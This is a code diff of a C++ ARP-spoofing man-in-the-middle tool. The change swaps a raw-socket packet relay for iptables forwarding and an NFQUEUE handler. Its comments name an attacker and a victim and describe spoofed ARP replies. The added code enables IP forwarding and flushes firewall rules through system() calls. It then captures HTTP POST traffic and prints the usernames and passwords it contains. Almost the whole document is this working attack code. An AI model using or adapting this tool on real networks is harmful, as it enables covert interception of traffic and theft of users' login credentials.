@@ -2,58 +2,30 @@
 
 // #define INFO 1
 
-/*
-Modify the source MAC address to the attacker to let the receiver think the packet is from the attacker
-Change the destination MAC address of the packet to the corresponding MAC address in the map
-*/
-bool modifyPacket(uint8_t *buffer, std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> &ip_mac_pairs, struct LocalInfo local_info) {
-    // Get the Ethernet header
-    struct ethhdr *eth = (struct ethhdr *)buffer;
-
-    // Get the IP header
-    struct iphdr *iph = (struct iphdr *)(buffer + ETH_HDRLEN);
-
-    bool modified = false;
-
-    // Change the source MAC to my MAC
-    memcpy(eth->h_source, local_info.src_mac.data(), ETH_ALEN);
-
-    // If the destination IP is not in the map, change the destination MAC to the gateway's MAC
-    if (ip_mac_pairs.find({(uint8_t)(iph->daddr & 0xff), (uint8_t)((iph->daddr >> 8) & 0xff), (uint8_t)((iph->daddr >> 16) & 0xff), (uint8_t)((iph->daddr >> 24) & 0xff)}) == ip_mac_pairs.end()) {
-        // Find the MAC address for the gateway IP
-        std::array<uint8_t, 4> gateway_ip_addr = {(uint8_t)(local_info.gateway_ip.sin_addr.s_addr & 0xff), (uint8_t)((local_info.gateway_ip.sin_addr.s_addr >> 8) & 0xff), (uint8_t)((local_info.gateway_ip.sin_addr.s_addr >> 16) & 0xff), (uint8_t)((local_info.gateway_ip.sin_addr.s_addr >> 24) & 0xff)};
-        std::array<uint8_t, 6> &gateway_mac = ip_mac_pairs[gateway_ip_addr];
-        memcpy(eth->h_dest, gateway_mac.data(), ETH_ALEN);
-        modified = true;
-    }
-    // If the destination MAC is my_mac and the IP is not my IP, change the destination MAC to the IP's MAC
-    if (memcmp(eth->h_dest, local_info.src_mac.data(), ETH_ALEN) != 0 && iph->daddr != local_info.src_ip.sin_addr.s_addr && !modified) {
-        // Find the MAC address for the destination IP
-        std::array<uint8_t, 4> dest_ip_addr;
-        memcpy(dest_ip_addr.data(), &iph->daddr, 4);
-        std::array<uint8_t, 6> &dest_mac = ip_mac_pairs[dest_ip_addr];
-        memcpy(eth->h_dest, dest_mac.data(), ETH_ALEN);
-        modified = true;
-    }
-    return modified;
+void handle_sigint(int sig) {
+    system("iptables -F");
+    system("iptables -F -t nat");
+    system("sysctl net.ipv4.ip_forward=0 > /dev/null");
+    exit(0);
 }
 
-// Function to send the large packet
-void sendNonHttpPostPacket(uint8_t *buffer, int bytes, int sd, struct LocalInfo local_info) {
-    // Get the payload
-    uint8_t *payload = buffer + ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr);
-    int payload_length = bytes - (ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr));
+void setup_forwarding(const char *interface, const char *gateway_ip) {
+    char command[100];
 
-    int chunk_size = 1024;  // Size of each chunk
-    int total_sent = 0;     // Total amount of data sent
-    while (total_sent < bytes) {
-        int to_send = std::min(chunk_size, bytes - total_sent);
-        if (sendto(sd, buffer + total_sent, to_send, 0, (struct sockaddr *)&local_info.device, sizeof(local_info.device)) <= 0) {
-            perror("sendto() failed (NonHttpPostPacket)");
-            exit(EXIT_FAILURE);
-        }
-        total_sent += to_send;
-    }
+    // Enable IP forwarding
+    system("sysctl net.ipv4.ip_forward=1 > /dev/null");
+
+    // Flush existing rules
+    system("iptables -F");
+    system("iptables -F -t nat");
+
+    // Setup masquerade for outgoing packets on the specified interface
+    sprintf(command, "iptables -t nat -A POSTROUTING -o %s -j MASQUERADE", interface);
+    system(command);
+
+    // Forward HTTP packets to NFQUEUE
+    sprintf(command, "iptables -A FORWARD -p tcp --dport 80 -j NFQUEUE");
+    system(command);
 }
 
 // Parse the POST HTTP packet and print the username and password
@@ -82,69 +54,93 @@ void printUsernameAndPassword(uint8_t *payload, int payload_length) {
     }
 }
 
-// Function to handle receiving responses
-void receiveHandler(int sd, std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> &ip_mac_pairs, struct LocalInfo local_info) {
-    uint8_t buffer[IP_MAXPACKET];
-    struct sockaddr saddr;
-    int saddr_len = sizeof(saddr);
 
-    while (true) {
-        // Receive packet
-        int bytes = recvfrom(sd, buffer, IP_MAXPACKET, 0, &saddr, (socklen_t *)&saddr_len);
-        if (bytes < 0) {
-            perror("recvfrom() failed");
-            exit(EXIT_FAILURE);
-        }
+static int handleNFQPacket(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
+                           struct nfq_data *nfa, void *data) {
+    struct nfqnl_msg_packet_hdr *ph;
+    struct nfqnl_msg_packet_hw *hwph;
+    u_int32_t id = 0;
+    struct NFQData *nfq_data = (struct NFQData *)data;
 
-        // Check if packet is an ARP packet
-        if (buffer[12] == ETH_P_ARP / 256 && buffer[13] == ETH_P_ARP % 256) {
-            parseARPReply(buffer, ip_mac_pairs, local_info);
-            continue;
-        }
-        // Check if the packet is an IP packet
-        if (bytes < ETH_HDRLEN + sizeof(struct iphdr)) {
-            continue;  // Not enough data for IP header
-        }
-        struct iphdr *iph = (struct iphdr *)(buffer + ETH_HDRLEN);  // Skip the Ethernet header
-        // If the ip is loopback, skip
-        if (iph->daddr == htonl(0x7f000001) || iph->saddr == htonl(0x7f000001)) {
-            continue;
-        }
-
-        // Modify the packet's MAC address
-        modifyPacket(buffer, ip_mac_pairs, local_info);
-
-        // Check if packet is a TCP packet
-        if (bytes < ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr)) {
-            if (sendto(sd, buffer, bytes, 0, (struct sockaddr *)&local_info.device, sizeof(local_info.device)) <= 0) {
-                perror("sendto() failed (CHECK TCP PACKET)");
-                exit(EXIT_FAILURE);
-            }
-            continue;  // Not enough data for TCP header
-        }
-
-        // Get the payload of the TCP packet
-        uint8_t *payload = buffer + ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr);
-        int payload_length = bytes - (ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr));
-
-        // Check if the payload is an HTTP POST packet
-        const char *http_post = "POST";
-
-        if (payload_length < strlen(http_post) || memcmp(payload, http_post, strlen(http_post)) != 0) {
-            sendNonHttpPostPacket(buffer, bytes, sd, local_info);
-            continue;
-        }
-
-        // Print the username and password
-        printUsernameAndPassword(payload, payload_length);
-
-        // Send the packet in order to prevent the victim from knowing the attack
-        if (sendto(sd, buffer, bytes, 0, (struct sockaddr *)&local_info.device, sizeof(local_info.device)) <= 0) {
-            perror("sendto() failed");
-            exit(EXIT_FAILURE);
-        }
-        memset(buffer, 0, IP_MAXPACKET);
+    ph = nfq_get_msg_packet_hdr(nfa);
+    if (ph) {
+        id = ntohl(ph->packet_id);
     }
+    unsigned char *packet;
+    int len = nfq_get_payload(nfa, &packet);
+    if (len < 0) {
+        printf("Error: nfq_get_payload returned %d\n", len);
+        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
+    }
+    // ip header
+    struct iphdr *iph = (struct iphdr *)packet;
+    int iph_len = iph->ihl * 4;
+    // tcp header
+    struct tcphdr *tcph = (struct tcphdr *)(packet + iph_len);
+    int tcph_len = tcph->doff * 4;
+
+    // Check whether the packet is a HTTP packet
+    if (iph->protocol != IPPROTO_TCP || tcph->dest != htons(80)) {
+        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
+    }
+
+    // Check whether the packet is a POST packet
+    if (memcmp(packet + iph_len + tcph_len, "POST", 4) == 0) {
+        // Dump the HTTP packet's payload
+        // for (int i = iph_len + tcph_len; i < len; i++) {
+        //     printf("%c", packet[i]);
+        // }
+
+        // Parse the POST packet and print the username and password
+        printUsernameAndPassword(packet + iph_len + tcph_len, len - iph_len - tcph_len);
+
+        // Reset payload
+        memset(packet + iph_len + tcph_len, 0, len - iph_len - tcph_len);
+    }
+
+    return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
+}
+
+void NFQHandler(struct LocalInfo local_info, std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> ip_mac_pairs) {
+    struct nfq_handle *h;
+    struct nfq_q_handle *qh;
+    struct nfnl_handle *nh;
+    int sd;
+    int rv;
+    char buf[4096] __attribute__((aligned));
+
+    struct NFQData nfq_data;
+    nfq_data.local_info = local_info;
+    nfq_data.ip_mac_pairs = ip_mac_pairs;
+
+    h = nfq_open();
+    if (!h) {
+        fprintf(stderr, "error during nfq_open()\n");
+        exit(1);
+    }
+    if (nfq_unbind_pf(h, AF_INET) < 0) {
+        fprintf(stderr, "error during nfq_unbind_pf()\n");
+        exit(1);
+    }
+    if (nfq_bind_pf(h, AF_INET) < 0) {
+        fprintf(stderr, "error during nfq_bind_pf()\n");
+        exit(1);
+    }
+    qh = nfq_create_queue(h, 0, &handleNFQPacket, &nfq_data);
+    if (!qh) {
+        fprintf(stderr, "error during nfq_create_queue()\n");
+        exit(1);
+    }
+    if (nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff) < 0) {
+        fprintf(stderr, "can't set packet_copy mode\n");
+        exit(1);
+    }
+    sd = nfq_fd(h);
+    while ((rv = recv(sd, buf, sizeof(buf), 0)) && rv >= 0) {
+        nfq_handle_packet(h, buf, rv);
+    }
+    nfq_destroy_queue(qh);
+    nfq_close(h);
 }
 
 int main(int argc, char **argv) {
@@ -199,19 +195,26 @@ int main(int argc, char **argv) {
     // Use a table to save IP-MAC pairs
     std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> ip_mac_pairs;
 
-    // Start the thread
-    std::thread send_thread(sendSpoofedARPReply, sd, std::ref(ip_mac_pairs), local_info);
-
     printf("Available devices\n");
     printf("-----------------------------------------\n");
     printf("IP\t\t\tMAC\n");
     printf("-----------------------------------------\n");
 
-    // Receive responses
-    receiveHandler(sd, ip_mac_pairs, local_info);
+    // Start the threads
+    std::thread send_thread(sendSpoofedARPReply, sd, std::ref(ip_mac_pairs), local_info);
+    std::thread receive_thread(receiveARPReply, sd, std::ref(ip_mac_pairs), local_info);
 
-    // Wait for the thread to finish
+    signal(SIGINT, handle_sigint);
+
+    // Setup IP forwarding
+    setup_forwarding(interface, inet_ntoa(local_info.gateway_ip.sin_addr));
+
+    // Start the NFQHandler
+    NFQHandler(local_info, ip_mac_pairs);
+
+    // Wait for threads to finish
     send_thread.join();
+    receive_thread.join();
 
     // Close socket descriptor.
     close(sd);
